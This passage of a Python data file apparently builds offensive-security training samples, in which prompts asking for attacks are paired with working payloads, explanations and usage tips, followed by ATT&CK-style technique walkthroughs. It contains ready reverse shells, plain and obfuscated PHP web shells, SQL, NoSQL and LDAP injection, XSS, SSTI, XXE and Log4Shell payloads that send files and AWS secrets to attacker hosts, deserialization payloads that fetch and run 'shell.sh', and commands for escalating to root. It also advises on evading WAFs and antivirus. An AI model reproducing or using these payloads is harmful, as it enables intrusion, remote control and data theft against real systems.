  "1. Creates a TCP socket and connects to attacker's IP:4444\n2. `os.dup2` redirects stdin(0), stdout(1), stderr(2) to the socket\n3. Spawns interactive bash shell with I/O over the socket\n4. Works on most Linux systems with Python installed\n5. Catch with `nc -lvnp 4444` on attacker machine",
  "Highly portable — Python is installed on most Linux servers. Use `python` instead of `python3` on older systems. For Windows targets, replace `/bin/bash` with `cmd.exe`.")

P("Generate a PHP reverse shell one-liner.",
  "Reverse Shell — PHP",
  'php -r \'$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");\'',
  "1. `fsockopen` creates TCP connection to attacker (file descriptor 3)\n2. `exec` spawns bash with stdin, stdout, stderr redirected to fd 3\n3. All shell I/O flows through the TCP connection\n4. Alternative using `proc_open` for more control over process streams\n5. Works on systems with PHP CLI installed",
  "Use on web servers with PHP. Alternative full version: `<?php $sock=fsockopen('IP',4444);$proc=proc_open('/bin/bash',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>`")

P("Generate a PowerShell reverse shell.",
  "Reverse Shell — PowerShell",
  "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close()",
  "1. Creates TCP client connection to attacker IP:4444\n2. Continuously reads commands from the stream\n3. Executes each command with `iex` (Invoke-Expression)\n4. Sends output back with PS prompt for interactivity\n5. Runs entirely in memory — no file on disk",
  "Primary shell for Windows targets. Encode with base64 for delivery: `powershell -e <base64>`. Use `powercat` for more features. AMSI bypass may be needed on modern Windows.")

P("Generate a Netcat reverse shell (with and without -e).",
  "Reverse Shell — Netcat",
  "# With -e (traditional netcat):\nnc -e /bin/bash ATTACKER_IP 4444\n\n# Without -e (OpenBSD netcat / when -e is unavailable):\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f",
  "1. `-e` variant: nc connects and pipes bash I/O through the connection directly\n2. mkfifo variant: creates named pipe `/tmp/f` for bidirectional communication\n3. `cat /tmp/f` reads from pipe → pipes to `bash -i` → output to `nc` → nc output back to pipe\n4. The mkfifo version works with all netcat variants\n5. Catch with `nc -lvnp 4444` on attacker side",
  "Most reliable reverse shell method. Use `-e` version with traditional ncat/netcat. Use mkfifo version when `-e` flag is not available (OpenBSD netcat, busybox nc).")

P("Generate a minimal PHP web shell.",
  "Web Shell — PHP One-Liner",
  '<?php system($_GET["c"]); ?>',
  "1. Accepts a GET parameter `c` containing the command to execute\n2. `system()` executes the command and displays output\n3. Access via: `http://target/shell.php?c=whoami`\n4. Smallest possible functional web shell — hard to detect by size\n5. Alternatives: `<?php echo shell_exec($_GET['c']); ?>` or `<?php passthru($_GET['c']); ?>`",
  "Upload via file upload vulnerability, write via SQLi INTO OUTFILE, or inject via LFI log poisoning. Use for initial access before upgrading to reverse shell.")

P("Generate an obfuscated PHP web shell.",
  "Web Shell — PHP Obfuscated",
  '<?php $f=base64_decode("c3lzdGVt");$f($_REQUEST[chr(99)]); ?>',
  "1. `base64_decode(\"c3lzdGVt\")` decodes to `system`\n2. `chr(99)` is the character `c` — the parameter name\n3. `$_REQUEST` accepts GET, POST, and COOKIE parameters\n4. Functionally identical to `<?php system($_REQUEST['c']); ?>`\n5. Evades basic string-matching WAF rules looking for `system`, `exec`, `shell_exec`",
  "Use when basic web shells are detected by WAF or antivirus. Further obfuscation: `$a='sys';$b='tem';$c=$a.$b;$c($_GET['x']);` or `call_user_func('system',$_GET['c']);`")

P("Generate a UNION-based SQL injection payload for MySQL.",
  "SQLi — UNION-Based (MySQL)",
  "# Step 1: Determine column count\n' ORDER BY 1--    (success)\n' ORDER BY 2--    (success)\n' ORDER BY 3--    (success)\n' ORDER BY 4--    (error → 3 columns)\n\n# Step 2: Find displayed columns\n' UNION SELECT 1,2,3--\n\n# Step 3: Extract data (assuming column 2 is displayed)\n' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n\n# Step 4: Extract columns from target table\n' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--\n\n# Step 5: Dump data\n' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--",
  "1. ORDER BY determines the number of columns in the original query\n2. UNION SELECT with matching column count identifies which columns render in output\n3. information_schema.tables enumerates all tables in the current database\n4. information_schema.columns enumerates columns of the target table\n5. Final payload concatenates username:password pairs from the users table\n6. `0x3a` is hex for `:` — avoids quote issues\n7. `GROUP_CONCAT` combines all rows into single output",
  "Requires at least one query result to be reflected in the page. If no output visible, switch to blind/error-based techniques.")

P("Generate a time-based blind SQL injection script.",
  "SQLi — Time-Based Blind",
  "# Concept: Infer data by measuring response times\n# If condition is TRUE, server sleeps 5 seconds\n\n# Extract database name character by character:\n' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--\n' AND IF(SUBSTRING(database(),1,1)='b', SLEEP(5), 0)--\n...\n# Response takes 5s when character matches\n\n# Python automation:\nimport requests, string, time\nresult = ''\nfor pos in range(1, 50):\n    for char in string.printable:\n        start = time.time()\n        r = requests.get(f\"http://target/page?id=1' AND IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(5),0)--\")\n        if time.time() - start > 4:\n            result += char\n            print(f'Found: {result}')\n            break",
  "1. SUBSTRING extracts one character at a position from the target string\n2. IF condition: when character matches, SLEEP(5) delays response by 5 seconds\n3. Attacker measures response time — delay indicates correct character\n4. Iterate through positions and characters to extract full string\n5. Works even when no query output is reflected (fully blind)\n6. Can extract any data: `database()`, `user()`, table contents",
  "Slowest SQLi technique but works universally. Use `BENCHMARK(5000000,SHA1('test'))` as SLEEP alternative if SLEEP is blocked. Optimize with binary search on ASCII values.")

P("Generate SQLi authentication bypass payloads.",
  "SQLi — Authentication Bypass",
  "# Classic:\n' OR '1'='1' --\n' OR '1'='1' /*\n' OR 1=1 --\n\n# With known username:\nadmin' --\nadmin' #\nadmin'/*\n\n# Password field bypass:\n' OR '1'='1\n') OR ('1'='1\n\n# MSSQL:\n' OR 1=1 --\na]' OR 1=1 --\n\n# Double query (comments):\n' OR ''='\n' OR 'x'='x\nadmin' OR '1'='1' --\n\n# Numeric field:\n1 OR 1=1\n1) OR (1=1",
  "1. These payloads modify the SQL WHERE clause to always evaluate TRUE\n2. `' OR '1'='1' --` closes the string, adds OR TRUE, comments rest\n3. `admin' --` logs in as admin by commenting out password check\n4. Different quote styles and comment syntaxes for different databases\n5. MySQL: `-- ` (space after), `#`, `/*`\n6. MSSQL/PostgreSQL: `--`\n7. Oracle: `--`",
  "First thing to try on login forms. Test both username and password fields. If single quotes are filtered, try double quotes or backslash escaping.")

P("Generate XSS payloads for filter bypass.",
  "XSS — Filter Bypass Techniques",
  "# Basic (if no filtering):\n<script>alert(1)</script>\n\n# Without script tags:\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<details open ontoggle=alert(1)>\n\n# Without parentheses:\n<img src=x onerror=alert`1`>\n<img src=x onerror=window.onerror=alert;throw+1>\n\n# Without alert:\n<img src=x onerror=confirm(1)>\n<img src=x onerror=prompt(1)>\n<img src=x onerror=print()>\n\n# Case bypass:\n<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=x OnErRoR=alert(1)>\n\n# Encoding:\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<a href=javascript:alert(1)>click</a>\n<a href=java&#x73;cript:alert(1)>click</a>",
  "1. Event handlers (`onerror`, `onload`, `onfocus`) execute JS without `<script>` tags\n2. Template literals (backticks) replace parentheses: `alert`1`` \n3. HTML entity encoding bypasses keyword filters\n4. Case alternation (`ScRiPt`) bypasses case-sensitive filters\n5. `autofocus` attribute auto-triggers `onfocus` without user interaction\n6. Multiple elements support event handlers — try less common ones if common are blocked",
  "Use when basic XSS is filtered. Test progressively: script tags → event handlers → encoding → case variation. Use Burp Intruder with XSS cheat sheet wordlist.")

P("Generate an XSS polyglot payload.",
  "XSS — Polyglot",
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
  "1. This polyglot works in multiple injection contexts simultaneously\n2. JavaScript URI context: `javascript:` prefix\n3. HTML attribute context: `oNcliCk=alert()`\n4. Inside `<style>`, `<title>`, `<textarea>`, `<script>` tags: closing tags included\n5. HTML comment escape: `--!>`\n6. SVG element: `<sVg/oNloAd=alert()//>`\n7. Mixed case bypasses case-sensitive filters\n8. Works in: href attributes, event handlers, script blocks, HTML body, and more",
  "Use as a single payload to test multiple injection contexts at once. If this triggers, the application is vulnerable. Useful for automated scanning where injection context is unknown.")

P("Generate Jinja2 SSTI payloads for RCE.",
  "SSTI — Jinja2 (Python/Flask)",
  "# Detection:\n{{7*7}} → 49\n{{7*'7'}} → 7777777\n\n# Config dump:\n{{config}}\n{{config.items()}}\n\n# Class enumeration:\n{{''.__class__.__mro__}}\n{{''.__class__.__mro__[1].__subclasses__()}}\n\n# RCE via subprocess.Popen (find index with loop):\n{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('id', shell=True, stdout=-1).communicate() }}{% endif %}{% endfor %}\n\n# RCE via os module:\n{{cycler.__init__.__globals__.os.popen('id').read()}}\n\n# File read:\n{{''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read()}}",
  "1. `{{7*7}}` confirms Jinja2 template execution\n2. MRO (Method Resolution Order) chain walks from string → object → all subclasses\n3. `__subclasses__()` lists all loaded Python classes\n4. Find `subprocess.Popen` or `os._wrap_close` for command execution\n5. `cycler.__init__.__globals__` accesses the global namespace containing `os` module\n6. RCE achieved without importing — uses existing loaded classes",
  "Flask/Jinja2 is the most common SSTI target. Test `{{7*7}}` first. If blocked, try `${7*7}` (other engines) or `#{7*7}` (Ruby ERB).")

P("Generate XXE payloads for file reading and SSRF.",
  "XXE — File Read and SSRF",
  "# File read (Linux):\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n\n# File read (Windows):\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]>\n<root>&xxe;</root>\n\n# SSRF - Internal port scan:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://10.0.0.1:22/\">]>\n<root>&xxe;</root>\n\n# SSRF - AWS metadata:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>\n<root>&xxe;</root>\n\n# PHP filter (base64 for binary files):\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/config.php\">]>\n<root>&xxe;</root>\n\n# OOB exfiltration (blind XXE):\n<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n%dtd;]>\n<root>&send;</root>\n\n# evil.dtd on attacker server:\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>\">\n%all;",
  "1. XXE exploits XML parsers that process external entities\n2. `SYSTEM` keyword loads content from files or URLs\n3. `file://` protocol reads local files, `http://` makes server-side requests\n4. PHP filters encode binary files as base64 for clean exfiltration\n5. OOB (Out-of-Band) XXE: when response isn't reflected, exfiltrate via DNS/HTTP to attacker server\n6. External DTD technique: load malicious DTD from attacker server that references local files",
  "Test on any endpoint accepting XML: API endpoints, SOAP services, file uploads (SVG, DOCX, XLSX contain XML). Check if DTD processing is enabled.")

P("Generate a Log4Shell (CVE-2021-44228) payload.",
  "Log4Shell — JNDI Injection",
  "# Basic payload:\n${jndi:ldap://ATTACKER_IP:1389/exploit}\n\n# In various headers:\nUser-Agent: ${jndi:ldap://ATTACKER_IP/ua}\nX-Forwarded-For: ${jndi:ldap://ATTACKER_IP/xff}\nReferer: ${jndi:ldap://ATTACKER_IP/ref}\n\n# Bypass WAF with nested lookups:\n${${lower:j}ndi:${lower:l}dap://ATTACKER/x}\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/x}\n${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//ATTACKER/x}\n\n# Data exfiltration:\n${jndi:ldap://ATTACKER/${env:AWS_SECRET_ACCESS_KEY}}\n${jndi:ldap://ATTACKER/${sys:user.dir}}\n${jndi:ldap://ATTACKER/${java:version}}",
  "1. Log4j 2.x evaluates `${...}` lookups in logged strings\n2. JNDI lookup connects to attacker's LDAP/RMI server\n3. Attacker's server returns reference to malicious Java class\n4. Target application loads and executes the malicious class — RCE\n5. Nested lookups (`${lower:j}`) bypass WAF rules matching `jndi`\n6. Environment variable exfiltration via DNS/LDAP callback URLs",
  "Affects Apache Log4j 2.0-beta9 through 2.14.1. Spray payload into every input field, header, and parameter. Set up rogue LDAP server with `marshalsec` or `JNDI-Exploit-Kit`.")

P("Generate NoSQL injection payloads for MongoDB.",
  "NoSQL Injection — MongoDB",
  "# Authentication bypass (JSON body):\n{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}\n\n# Alternative operators:\n{\"username\": \"admin\", \"password\": {\"$ne\": \"wrong\"}}\n{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$gt\": \"\"}}\n\n# URL parameter injection:\nusername[$gt]=&password[$gt]=\nusername=admin&password[$ne]=x\n\n# Extract password character by character:\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^ab\"}}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^abc\"}}\n\n# JavaScript injection (if $where is used):\n{\"$where\": \"this.username == 'admin' && this.password.match(/^a/)\"}\n{\"$where\": \"function(){return this.username=='admin'}\"}\n\n# Denial of Service:\n{\"$where\": \"sleep(5000)\"}",
  "1. MongoDB query operators (`$gt`, `$ne`, `$regex`) can be injected via JSON\n2. `{\"$gt\": \"\"}` matches any non-empty string — bypasses authentication\n3. `$regex` extracts data character by character (blind extraction)\n4. `$where` enables JavaScript execution in MongoDB context\n5. URL parameter parsing in Express.js converts `field[$gt]=` to `{field: {$gt: ''}}`",
  "Target Node.js/Express applications using MongoDB. Test both JSON POST body and URL parameter injection. `$where` is most dangerous but often disabled in modern MongoDB.")

P("Generate GraphQL introspection and data extraction queries.",
  "GraphQL — Introspection & Data Dump",
  "# Full introspection query:\n{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name}}}}}}\n\n# List all types:\n{__schema{types{name}}}\n\n# Get fields of specific type:\n{__type(name:\"User\"){fields{name type{name}}}}\n\n# Enumerate queries:\n{__schema{queryType{fields{name args{name type{name}}}}}}\n\n# Enumerate mutations:\n{__schema{mutationType{fields{name args{name type{name}}}}}}\n\n# Dump data (after discovery):\n{users{id username email password role}}\n\n# Bypass query depth limits:\n{user(id:1){friends{friends{friends{...}}}}}\n\n# Batch query for IDOR:\n{u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email}}",
  "1. Introspection reveals the entire API schema — types, fields, queries, mutations\n2. Alias queries (`u1:`, `u2:`) enable batch data extraction in a single request\n3. Mutations may expose dangerous operations: `deleteUser`, `updateRole`, `resetPassword`\n4. Nested queries can cause DoS (query depth/complexity attacks)\n5. Many GraphQL APIs have introspection enabled in production (it's on by default)",
  "First step in GraphQL testing — always try introspection. Use GraphQL Voyager or InQL Burp extension to visualize schema. If introspection is disabled, try field suggestion/brute-force with common names.")

P("Generate HTTP request smuggling payloads (CL.TE and TE.CL).",
  "HTTP Request Smuggling",
  "# CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n\n# TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n\n# CL.TE with request hijacking:\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 56\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: target.com\nFoo: bar",
  "1. Request smuggling exploits disagreement between front-end and back-end on request boundaries\n2. CL.TE: front-end reads Content-Length bytes, back-end processes Transfer-Encoding chunked\n3. `0\\r\\n\\r\\n` ends the chunked body for back-end, but front-end already consumed all CL bytes\n4. `SMUGGLED` becomes prefix of the next request on the back-end connection\n5. Enables: accessing restricted endpoints, hijacking other users' requests, cache poisoning",
  "Use Burp Suite's HTTP Request Smuggler extension for detection. Requires keep-alive connections. Test with timing-based detection before sending destructive payloads.")

P("Generate a Python pickle RCE payload.",
  "Deserialization — Python Pickle",
  "import pickle\nimport os\nimport base64\n\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('curl ATTACKER_IP/shell.sh | bash',))\n\npayload = base64.b64encode(pickle.dumps(RCE()))\nprint(payload.decode())\n\n# Alternative with subprocess:\nclass RCE2:\n    def __reduce__(self):\n        import subprocess\n        return (subprocess.check_output, (['id'],))\n\n# Alternative — reverse shell:\nclass RCE3:\n    def __reduce__(self):\n        return (os.system, ('python3 -c \\'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])\\'',))",
  "1. Python's `pickle` module can serialize/deserialize arbitrary Python objects\n2. `__reduce__` method is called during deserialization — controls how object is reconstructed\n3. Returning `(os.system, ('command',))` executes the command during unpickling\n4. Payload is base64-encoded serialized bytes — send to any endpoint that calls `pickle.loads()`\n5. No safe way to deserialize untrusted pickle data — it's inherently dangerous",
  "Target any Python application that deserializes user-supplied pickle data: Redis sessions, Flask cookies with pickle serializer, ML model loading, message queues.")

P("Generate a ysoserial Java deserialization payload.",
  "Deserialization — Java ysoserial",
  "# Generate payload:\njava -jar ysoserial.jar CommonsCollections1 'curl ATTACKER/shell.sh | bash' > payload.bin\n\n# Common gadget chains:\n# CommonsCollections1-7 (Apache Commons Collections)\n# Spring1-2 (Spring Framework)\n# Groovy1 (Groovy runtime)\n# JRMPClient (JRMP callback)\n# URLDNS (DNS callback for detection — no RCE)\n\n# Send payload:\ncurl -X POST http://target/api \\\n  -H 'Content-Type: application/x-java-serialized-object' \\\n  --data-binary @payload.bin\n\n# Detection (safe — DNS only, no RCE):\njava -jar ysoserial.jar URLDNS 'http://BURP_COLLABORATOR_URL' > detect.bin\n\n# Base64-encoded for cookie/parameter injection:\ncat payload.bin | base64 -w0",
  "1. ysoserial generates serialized Java objects that trigger code execution during deserialization\n2. Different gadget chains exploit different libraries on the classpath\n3. CommonsCollections is the most common — present in many Java applications\n4. URLDNS chain is safe for detection — only makes DNS lookup, no code execution\n5. Payload triggers when `ObjectInputStream.readObject()` is called on the bytes\n6. Always try URLDNS first to confirm deserialization without causing damage",
  "Target Java applications with serialized objects in: cookies, POST bodies, JMX, RMI, JMS. Identify by `rO0AB` base64 prefix or `AC ED 00 05` hex in binary. Try multiple gadget chains — success depends on classpath libraries.")

P("Generate an LDAP injection payload.",
  "LDAP Injection",
  "# Authentication bypass:\nUsername: *\nPassword: *\n\n# With closing filter:\nUsername: admin)(&)\nPassword: anything\n\n# Dump all users:\nUsername: *)(objectClass=*\nPassword: anything\n\n# Blind extraction (if no output):\nUsername: admin)(password=a*\nUsername: admin)(password=b*\n... (iterate characters)\n\n# Bypass with null byte:\nUsername: admin)%00\n\n# The vulnerable query looks like:\n# (&(uid=USERNAME)(userPassword=PASSWORD))\n# With injection: (&(uid=*)(objectClass=*))(userPassword=anything))",
  "1. LDAP queries use filter syntax: `(&(uid=user)(password=pass))`\n2. Injecting `*` as username matches all entries (wildcard)\n3. `admin)(&)` closes the uid filter, adds always-true filter, remaining is ignored\n4. Blind extraction: `admin)(password=a*` — if login succeeds, password starts with 'a'\n5. Iterate characters to extract full password\n6. Null byte `%00` terminates the LDAP filter string early",
  "Target enterprise applications using LDAP/Active Directory authentication. Common in Java EE, PHP with ldap_search, and legacy web applications. Test login forms, user search, and directory lookup features.")

P("Generate a WebSocket hijacking payload.",
  "WebSocket Hijacking (CSWSH)",
  "<!-- Cross-Site WebSocket Hijacking -->\n<script>\n  // Connect to target WebSocket using victim's cookies\n  var ws = new WebSocket('wss://target.com/ws');\n\n  ws.onopen = function() {\n    // Send commands as the authenticated victim\n    ws.send(JSON.stringify({action: 'getProfile'}));\n  };\n\n  ws.onmessage = function(event) {\n    // Exfiltrate received data to attacker\n    fetch('https://attacker.com/exfil', {\n      method: 'POST',\n      body: event.data\n    });\n  };\n</script>",
  "1. WebSocket connections from browser include cookies automatically (same as CSRF)\n2. If server doesn't validate `Origin` header, any website can establish WS connection\n3. Victim visits attacker's page → browser connects to target's WebSocket with victim's session\n4. Attacker sends commands and receives responses through the hijacked connection\n5. Unlike CSRF, WebSocket hijacking provides bidirectional communication",
  "Test by checking if WebSocket handshake validates Origin header. If `wss://target.com/ws` accepts connections from any origin, CSWSH is possible. Similar to CSRF but for WebSocket endpoints.")

# ═══════════════════════════════════════════════════════════════
# SECTION 4: ATTACK TECHNIQUES (25 samples)
# ═══════════════════════════════════════════════════════════════

A("TCP SYN port scanning with nmap",
  "T1046 — Network Service Discovery",
  "Discover open ports and running services on target hosts using TCP SYN (half-open) scanning. SYN scans are faster and stealthier than full TCP connect scans because they don't complete the three-way handshake.",
  ["Ping sweep to discover live hosts: `nmap -sn 10.0.0.0/24`",
   "SYN scan top 1000 ports: `nmap -sS 10.0.0.1`",
   "Full port scan: `nmap -sS -p- 10.0.0.1` (all 65535 ports)",
   "Service version detection: `nmap -sS -sV -p 22,80,443,3306 10.0.0.1`",
   "OS detection: `nmap -sS -O 10.0.0.1`",
   "Aggressive scan: `nmap -A -T4 10.0.0.1` (OS, version, scripts, traceroute)",
   "Script scan for vulns: `nmap -sS --script=vuln 10.0.0.1`",
   "Output: `nmap -sS -sV -oA scan_results 10.0.0.1` (all formats)"],
  "**nmap** (primary), **masscan** (fast large-scale), **rustscan** (fast + nmap integration), **zmap** (internet-wide scans)",
  "IDS/IPS detects SYN scans via incomplete handshakes. Firewall logs show SYN without ACK. Rate-based detection triggers on rapid connection attempts. Use `-T2` or `--scan-delay` to evade rate-based detection.")

A("Subdomain enumeration",
  "T1590.002 — Gather Victim Network Information: DNS",
  "Discover subdomains of a target domain to expand the attack surface. Combines passive (no direct contact) and active (DNS queries) techniques.",
  ["Passive DNS from Certificate Transparency: `curl 'https://crt.sh/?q=%25.target.com&output=json' | jq '.[].name_value' | sort -u`",
   "subfinder (passive): `subfinder -d target.com -all -o subs.txt`",
   "amass (comprehensive): `amass enum -d target.com -passive -o amass_subs.txt`",
   "DNS brute-force: `gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt`",
   "Resolve discovered subdomains: `cat subs.txt | httpx -silent -status-code -title`",
   "Check for subdomain takeover: `subjack -w subs.txt -t 100 -ssl`",
   "Virtual host discovery: `ffuf -w subs.txt -u http://TARGET_IP -H 'Host: FUZZ.target.com'`",
   "Combine and deduplicate: `cat *.txt | sort -u > all_subs.txt`"],
  "**subfinder**, **amass**, **gobuster**, **ffuf**, **httpx**, **crt.sh**, **subjack**, **dnsrecon**",
  "DNS query logging reveals enumeration. Passive techniques (crt.sh, SecurityTrails) leave no traces on target. Active brute-force generates high DNS query volume — detectable by DNS monitoring.")

A("Web directory and file brute-force",
  "T1595.003 — Active Scanning: Wordlist Scanning",
  "Discover hidden directories, files, and endpoints on web servers by fuzzing URL paths with wordlists.",
  ["Basic directory scan: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`",
   "With extensions: `gobuster dir -u http://target.com -w common.txt -x php,html,txt,bak,sql,zip`",
   "Recursive: `feroxbuster -u http://target.com -w common.txt --depth 3`",
   "With authentication: `gobuster dir -u http://target.com -w common.txt -c 'session=abc123'`",
   "Filter by status code: `ffuf -u http://target.com/FUZZ -w common.txt -mc 200,301,302,403`",
   "Filter by response size: `ffuf -u http://target.com/FUZZ -w common.txt -fs 1234`",
   "Check for backup files: `http://target.com/index.php.bak`, `config.yml.old`, `db.sql.gz`",
   "Common interesting finds: `.git/`, `.env`, `wp-config.php.bak`, `phpinfo.php`, `/api/swagger.json`"],
  "**gobuster**, **feroxbuster**, **ffuf**, **dirsearch**, **wfuzz**, **dirbuster**",
  "WAF rate-limiting and 429 responses. Web server access logs show sequential 404s. Anomalous request patterns (alphabetical paths, rapid requests from single IP).")

A("Google dorking for sensitive files",
  "T1593.002 — Search Open Websites/Domains",
  "Use Google search operators to find sensitive files, exposed admin panels, and misconfigured servers indexed by search engines.",
  ["Find exposed config files: `site:target.com filetype:env OR filetype:yml OR filetype:xml`",
   "Find login pages: `site:target.com inurl:admin OR inurl:login OR inurl:dashboard`",
   "Find exposed databases: `site:target.com filetype:sql OR filetype:db OR filetype:sqlite`",
   "Find backup files: `site:target.com filetype:bak OR filetype:old OR filetype:zip`",
   "Find PHP info pages: `site:target.com inurl:phpinfo OR intitle:phpinfo`",
   "Find directory listings: `site:target.com intitle:\"Index of /\" OR intitle:\"Directory listing\"`",
   "Find exposed Git repos: `site:target.com inurl:.git`",
   "Find error pages with info: `site:target.com \"Fatal error\" OR \"Warning:\" OR \"Stack trace\"`",
   "Find AWS/cloud keys: `site:target.com \"AKIA\" OR \"aws_secret\" OR \"api_key\"`"],
  "**Google Search**, **Google Hacking Database (GHDB)**, **DorkSearch.com**, **Shodan**, **Censys**",
  "Google Search Console alerts site owners to indexed sensitive pages. Robots.txt and meta robots tags can prevent indexing. Organizations should regularly dork their own domains.")

A("SUID binary exploitation for Linux privilege escalation",
  "T1548.001 — Abuse Elevation Control Mechanism: SUID",
  "Find and exploit SUID (Set User ID) binaries to escalate privileges. SUID binaries run with the file owner's permissions (often root) regardless of who executes them.",
  ["Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`",
   "Also check: `find / -perm -2000 -type f 2>/dev/null` (SGID)",
   "Cross-reference with GTFOBins: `https://gtfobins.github.io/#+suid`",
   "Common exploitable SUID binaries: `find`, `vim`, `python`, `bash`, `nmap`, `less`, `cp`",
   "Example — SUID find: `find . -exec /bin/bash -p \\;` (preserves effective UID)",
   "Example — SUID vim: `vim -c ':!/bin/bash'` (drops to shell from vim)",
   "Example — SUID python: `python -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'`",
   "Example — SUID nmap (old): `nmap --interactive` then `!sh`",
   "Check for custom SUID binaries — may have buffer overflows or command injection"],
  "**find**, **GTFOBins**, **LinPEAS**, **linux-exploit-suggester**",
  "File integrity monitoring (AIDE, OSSEC) detects new SUID files. Audit SUID binaries regularly: `find / -perm -4000 -ls`. Remove SUID bit from unnecessary binaries.")

A("Sudo misconfiguration exploitation",
  "T1548.003 — Abuse Elevation Control Mechanism: Sudo",
  "Exploit sudo misconfigurations to escalate from unprivileged user to root. Common in CTFs and real-world pentests.",
  ["Check sudo permissions: `sudo -l`",
   "If `(ALL) NOPASSWD: /usr/bin/vim`: `sudo vim -c ':!/bin/bash'`",
   "If `(ALL) NOPASSWD: /usr/bin/find`: `sudo find /tmp -exec /bin/bash \\;`",
   "If `(ALL) NOPASSWD: /usr/bin/python3`: `sudo python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`",
   "If `(ALL) NOPASSWD: /usr/bin/less`: `sudo less /etc/hosts` then `!bash`",
   "If `(ALL) NOPASSWD: /usr/bin/awk`: `sudo awk 'BEGIN {system(\"/bin/bash\")}'`",
   "If `env_keep += LD_PRELOAD`: compile malicious shared library and preload it",
   "Wildcard exploitation: if sudo allows `/opt/scripts/*.sh`, create symlink to exploit"],
  "**sudo -l**, **GTFOBins**, **LinPEAS**, **pspy** (process monitor)",
  "Audit sudoers file regularly. Use `NOEXEC` tag to prevent shell escapes. Avoid wildcards in sudoers paths. Monitor `sudo` usage via syslog/auditd.")

A("Docker group privilege escalation",
  "T1611 — Escape to Host",
  "If a user is a member of the `docker` group, they can mount the host filesystem into a container and gain root access to the host.",
  ["Check group membership: `id` — look for `docker` group",
   "Verify Docker access: `docker ps`",
   "Mount host filesystem: `docker run -v /:/mnt/host -it alpine chroot /mnt/host bash`",
   "This gives root shell on the host via chroot into mounted filesystem",
   "Alternative — write SSH key: `docker run -v /root/.ssh:/root/.ssh -it alpine sh -c 'echo ssh-rsa AAAA... >> /root/.ssh/authorized_keys'`",
   "Alternative — read shadow file: `docker run -v /etc:/mnt/etc -it alpine cat /mnt/etc/shadow`",
   "Alternative — add SUID bash: `docker run -v /:/host -it alpine sh -c 'cp /host/bin/bash /host/tmp/rootbash; chmod +s /host/tmp/rootbash'` then `/tmp/rootbash -p`"],
  "**docker**, **alpine image** (lightweight container for exploitation)",
  "Monitor Docker socket access. Remove users from `docker` group unless necessary. Use rootless Docker mode. Monitor `docker run` commands with audit logging.")

A("Windows token impersonation privilege escalation",
